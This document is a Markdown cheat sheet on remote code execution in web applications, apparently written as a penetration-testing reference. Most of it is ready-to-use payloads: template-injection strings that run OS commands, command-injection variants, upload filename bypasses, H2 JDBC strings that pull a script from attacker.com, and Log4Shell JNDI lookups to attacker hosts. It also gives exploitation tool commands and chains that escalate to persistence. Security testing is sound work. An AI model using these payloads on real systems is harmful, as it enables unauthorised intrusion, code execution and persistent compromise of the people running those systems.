# RCE Techniques

> Remote Code Execution — achieving arbitrary command execution on a target system through web application vulnerabilities.

## Surface

- File upload endpoints — SVG, PHAR, JSP, ASPX, polyglot uploads
- Template engines — SSTI in Jinja2, Twig, Freemarker, Velocity, Pebble
- JDBC/database connection string injection — H2 `INIT=`, PostgreSQL COPY
- XML deserialization — .NET `XmlSerializer`, Java `XMLDecoder`, PHP `unserialize`
- SSRF to internal services — pivot to metadata API, Redis, Memcached, Gopher
- Command injection in shell-invoking functions — `exec`, `system`, `popen`, `Runtime.exec`
- Log4Shell-style JNDI injection in logged user-controlled fields
- Insecure eval/code execution in node.js/Ruby/Python — `eval(params[:code])`

## Test Approach

1. **SSTI detection** — inject math expressions that differ between reflection and eval:
   ```
   {{7*7}}  → 49 = SSTI
   ${7*7}   → 49 = EL/Freemarker
   <%= 7*7 %> → 49 = ERB
   ```
2. **SSTI escalation** (Jinja2):
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
3. **File upload — PHAR/JSP**:
   - Rename `.php` to `.php5`, `.phtml`, `.php%00.jpg`
   - Upload SVG with `<script>` or SSRF-triggering XXE
   - Try PHAR deserialization: `phar://upload/file.jpg/exploit`
4. **JDBC H2 injection** — probe unauthenticated setup/validation endpoints:
   ```
   {"db": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/rce.sql'"}
   ```
5. **Command injection** — probe shell-adjacent params:
   ```
   ?host=127.0.0.1;id
   ?filename=test$(id).txt
   ?cmd=127.0.0.1`id`
   ```
6. **SSRF → internal RCE pivot** — use gopher:// to hit Redis `SLAVEOF`, or Memcached `set` for deserialization
7. **Log4Shell** — probe all headers and params:
   ```
   ${jndi:ldap://collab.attacker.com/a}
   X-Api-Version: ${jndi:ldap://...}
   ```

## Tools

- **nuclei** — SSTI, Log4Shell, RCE templates: `nuclei -t rce/ -u https://target.com`
- **tplmap** — automated SSTI exploitation: `python3 tplmap.py -u "https://target.com/render?name=*"`
- **Interactsh** — OOB callback server for blind RCE: `interactsh-client`
- **ysoserial** — Java deserialization gadget chains: `java -jar ysoserial.jar CommonsCollections6 'id'`
- **commix** — command injection automation: `commix --url="https://target.com/ping?host=*"`

## Payloads / Probes

```
# SSTI - Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# SSTI - Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Command injection variants
; id
$(id)
`id`
| id
%0aid

# H2 JDBC RCE
jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/cmd.sql'

# Log4Shell
${jndi:ldap://attacker.interactsh.com/a}
${${lower:j}ndi:${lower:l}dap://attacker.com/a}

# PHP file upload - null byte bypass
filename="shell.php%00.jpg"
```

## Chain Opportunities

- **SSRF → RCE** — SSRF reaches internal Jenkins/Solr/Redis, pivot to code execution
- **SSTI → RCE → persistence** — write cron job or SSH key via template engine
- **File upload → RCE** — bypass extension filter, execute webshell
- **JDBC injection → RCE** — H2/PostgreSQL INIT scripts execute OS commands
- **Deserialization → RCE** — Java/PHP gadget chains in XML, session cookies, API params

## Recent Intel

- **CVE-2023-24489** · Citrix ShareFile pre-auth RCE via `UploadClientModule.asmx` — unsafe .NET XML deserialization, `ObjectDataProvider` gadget chain · https://www.assetnote.io/resources/research/advisory-sharefile-pre-auth-rce-cve-2023-24489
- **CVE-2023-34362** · MOVEit Transfer RCE — deserialization in file processing pipeline, SYSTEM-level compromise via crafted file transfer · https://www.assetnote.io/resources/research/moveit-transfer-rce-part-two-cve-2023-34362
- **CVE-2023-38646** · Metabase pre-auth RCE — H2 JDBC `INIT` param via `/api/setup/validate`, SQL → Java method invocation chain · https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646
